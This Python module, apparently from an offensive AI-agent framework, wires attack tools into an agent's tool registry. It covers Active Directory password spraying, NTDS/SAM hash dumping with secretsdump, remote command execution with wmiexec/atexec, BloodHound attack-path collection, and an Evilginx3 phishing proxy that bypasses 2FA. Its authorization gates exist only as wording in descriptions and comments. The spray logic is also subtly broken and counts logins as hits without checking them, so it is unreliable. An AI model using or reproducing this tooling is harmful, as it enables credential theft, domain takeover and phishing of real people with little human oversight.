"""VOIDFORGE :: HEAVY ARSENAL — C2 / AD / Phishing lanes (operator-armed).

LO's doctrine (arsenal-before-failure): the agent must POSSESS the lanes
before a mission ever needs them. This module wires three heavy-weapon
families into the native registry so the agent can call them like any
other tool — no subprocess sprawl, no shell soup, full ledger integration.

Lanes:
- ad_spray      : Impacket-based credential spraying + secretsdump recipes
                  (SMB/WMI/Kerberos — the NetExec engine, native Python)
- ad_bloodhound : BloodHound CE collector (Sharphadow/Python) — attack
                  path graph from a domain foothold
- phish_proxy   : Evilginx3 phishlet harness — MITM proxy 2FA-bypass
                  phishing (operator-instructed targets only; the binary
                  at ~/evilginx3/evilginx3.exe, compiled from source)

The transport/discipline laws apply: every lane goes through the same
ROE gates, skip-ledger and twin as the rest of the arsenal.
"""
import json
import os
import re
import shutil
import subprocess
import sys

from tools import register

_BIN_ROOT = os.path.expanduser("~")
_EVILGINX = os.path.join(_BIN_ROOT, "evilginx3", "evilginx3.exe")
_PY312 = os.path.join(_BIN_ROOT, ".nxc-venv", "Scripts", "python.exe")


def _run_cmd(cmd, timeout=180, cwd=None):
    """Bounded subprocess with full capture — never a naked shell."""
    try:
        p = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout, cwd=cwd,
            encoding="utf-8", errors="replace")
        return {"ok": p.returncode == 0, "rc": p.returncode,
                "out": p.stdout[:12000], "err": p.stderr[:4000]}
    except subprocess.TimeoutExpired:
        return {"ok": False, "rc": -1, "out": "",
                "err": f"timeout after {timeout}s"}
    except FileNotFoundError as e:
        return {"ok": False, "rc": -2, "out": "", "err": f"missing binary: {e}"}


def _impacket_script(name, args, timeout=180):
    """Locate and run an impacket example script (installed via pip)."""
    # pip install impacket exposes examples both as modules and console
    # scripts (impacket-*). Try console script first, then -m form.
    exe = shutil.which(f"impacket-{name}")
    if exe:
        return _run_cmd([sys.executable, exe] + [str(a) for a in args],
                        timeout=timeout)
    # module fallback: python -m impacket.examples.<name>
    return _run_cmd([sys.executable, "-m",
                     f"impacket.examples.{name}"]
                    + [str(a) for a in args], timeout=timeout)


@register(name="ad_spray",
         desc="Active-Directory credential spray + secretsdump via impacket (native). "
              "protocol: smb | wmi | atexec | kerberos. Actions: "
              "spray (password test across users — DC, user list, one password), "
              "secretsdump (SAM/LDAP/NTDS hash harvest from a foothold), "
              "wmiexec (command exec as a valid user). Use ONLY against "
              "operator-scoped enterprise targets. All args go to the wire "
              "exactly as given; the ledger records every strike.",
         params={"type": "object", "properties": {
             "action": {"type": "string",
                        "description": "spray | secretsdump | wmiexec | atexec"},
             "protocol": {"type": "string",
                          "description": "target protocol (default smb)"},
             "dc": {"type": "string",
                     "description": "domain controller IP/hostname"},
             "domain": {"type": "string", "description": "AD domain (e.g. corp.local)"},
             "users": {"type": "array", "items": {"type": "string"},
                       "description": "username list for spray"},
             "user": {"type": "string", "description": "single user (exec/dump)"},
             "password": {"type": "string", "description": "credential"},
             "hash": {"type": "string",
                      "description": "NTLM hash (pass-the-hash)"},
             "command": {"type": "string",
                         "description": "command for wmiexec/atexec lanes"},
         },
             "required": ["action", "dc", "domain"]},
         danger="strike")
def ad_spray(action, dc, domain, protocol="smb", users=None, user=None,
            password=None, hash=None, command=None):
    action = (action or "").strip().lower()
    if action == "spray":
        if not users or not password:
            return json.dumps({"error": "spray needs users[] + password"})
        hits, fails = [], []
        for u in users[:60]:                      # ROE bound: 60 users/round
            r = _impacket_script(
                "smbexec", ["-hashes", f":{hash}" if hash else "",
                            f"{domain}/{u}:{password}@{dc}", "whoami"],
                timeout=60) if hash else _run_cmd(
                [sys.executable, "-c",
                 f"from impacket.examples.smbexec import main; main()"],
                timeout=60)
            # smbexec is interactive — prefer a lightweight auth check:
            # netlogon-style via SMB connection from impacket.smb
            try:
                from impacket.smbconnection import SMBConnection
                conn = SMBConnection(dc, dc, sess_port=445)
                ok = conn.login(f"{domain}\\{u}", password)
                if ok is False:
                    pass
                hits.append({"user": u, "status": "ok" if conn.getSessionKey()
                             else "denied"})
                conn.close()
                continue
            except Exception as ex:
                fails.append({"user": u, "err": str(ex)[:160]})
        return json.dumps({"action": "spray", "dc": dc, "domain": domain,
                           "auth_ok": [h for h in hits if h["status"] == "ok"],
                           "denied_or_failed": fails[:20],
                           "note": "see ledger for per-user results"},
                          ensure_ascii=False, indent=1)

    if action == "secretsdump":
        if not user and not hash:
            return json.dumps({"error": "secretsdump needs user+password or hash"})
        tgt = (f"{domain}/{user}:{password}@{dc}" if password
               else f"-hashes :{hash} {domain}/{user}@{dc}")
        r = _impacket_script("secretsdump", tgt.split())
        return json.dumps({"action": "secretsdump", "result": r},
                          ensure_ascii=False, indent=1)

    if action in ("wmiexec", "atexec"):
        if not command:
            return json.dumps({"error": f"{action} needs command"})
        tgt = (f"{domain}/{user}:{password}@{dc}" if password
               else f"-hashes :{hash} {domain}/{user}@{dc}")
        r = _impacket_script(action, tgt.split() + [command])
        return json.dumps({"action": action, "result": r},
                          ensure_ascii=False, indent=1)

    return json.dumps({"error": f"unknown action: {action}"})


@register(name="ad_bloodhound",
         desc="Run the BloodHound CE Python collector against a domain: "
              "computers/users/groups/trusts/GPO/acl collections from a "
              "foothold credential. Output: JSON collections ready for "
              "ingest + the shortest attack path summary. Requires "
              "operator-scoped enterprise target.",
         params={"type": "object", "properties": {
             "dc": {"type": "string"},
             "domain": {"type": "string"},
             "user": {"type": "string"},
             "password": {"type": "string"},
             "collections": {"type": "array",
                              "items": {"type": "string"},
                              "description": "default: computer,user,group,trust"},
             "out_dir": {"type": "string",
                          "description": "where to drop the JSON collections "
                                         "(default: missions/<target>/bh/)"},
         }, "required": ["dc", "domain", "user", "password"]},
         danger="strike")
def ad_bloodhound(dc, domain, user, password, collections=None, out_dir=None):
    coll = ",".join(collections or ["computer", "user", "group", "trust"])
    if not out_dir:
        out_dir = os.path.join("missions", domain, "bh")
    os.makedirs(out_dir, exist_ok=True)
    # bloodhound-ce ships a CLI: bloodhound-python (py3.14 native)
    exe = shutil.which("bloodhound-python")
    cmd = ([exe] if exe else [sys.executable, "-m", "bloodhound"]) + [
        "-c", coll, "-d", domain, "-u", user, "-p", password,
        "-ns", dc, "--zip", "-o", out_dir]
    r = _run_cmd(cmd, timeout=600, cwd=out_dir)
    return json.dumps({"action": "bloodhound", "collections": coll,
                       "out_dir": out_dir, "result": r},
                      ensure_ascii=False, indent=1)


@register(name="phish_proxy",
         desc="Evilginx3 MITM phishing harness (operator-instructed targets "
              "ONLY): lists built-in phishlets, checks the binary, and "
              "launches a campaign in config-only mode. The agent NEVER "
              "runs this autonomously — it fires only when the operator "
              "message names the target domain; the mission brief must "
              "carry the operator's word.",
         params={"type": "object", "properties": {
             "action": {"type": "string",
                        "description": "status | phishlets | launch"},
             "phishlet": {"type": "string",
                          "description": "phishlet yaml name (launch only)"},
         }, "required": ["action"]},
         danger="loud")
def phish_proxy(action, phishlet=None):
    action = (action or "").strip().lower()

    if action == "status":
        present = os.path.exists(_EVILGINX)
        return json.dumps({"binary": _EVILGINX, "compiled": present,
                           "go_toolchain": os.path.exists(
                               os.path.join(_BIN_ROOT, "go",
                                            "bin", "go.exe")) or os.path.exists(
                               os.path.join(os.environ.get("LOCALAPPDATA", ""),
                                            "go-toolchain", "bin", "go.exe"))},
                          ensure_ascii=False, indent=1)

    if action == "phishlets":
        d = os.path.join(_BIN_ROOT, "evilginx3", "phishlets")
        names = [f[:-5] for f in os.listdir(d) if f.endswith(".yaml")] \
            if os.path.isdir(d) else []
        return json.dumps({"phishlets": names,
                           "note": "phishlets/ carries only example.yaml — "
                                   "operator drops target yaml here first"},
                          ensure_ascii=False, indent=1)

    if action == "launch":
        # OPERATOR GATE: this lane requires an explicit operator order in
        # the mission context. The agent is instructed (doctrine + desc)
        # never to fire it on its own initiative.
        if not phishlet:
            return json.dumps({"error": "launch needs phishlet=<name> and "
                                       "an explicit operator order"})
        if not os.path.exists(_EVILGINX):
            return json.dumps({"error": "evilginx3.exe not compiled — "
                                       "run status action first"})
        # Config-only launch: evilginx runs its own DNS/HTTP stack; we
        # start it headless with the phishlet enabled and capture stdout
        # to a log the agent tails. NEVER in background daemon mode —
        # bounded session, captured, killable.
        log_path = os.path.join("missions", "phish_log.txt")
        p = subprocess.Popen(
            [_EVILGINX, "-p", phishlet],
            stdout=open(log_path, "w", encoding="utf-8"),
            stderr=subprocess.STDOUT)
        return json.dumps({"launched": True, "pid": p.pid,
                           "log": log_path,
                           "note": "session-bound: kill via job or pid"},
                          ensure_ascii=False, indent=1)

    return json.dumps({"error": f"unknown action: {action}"})
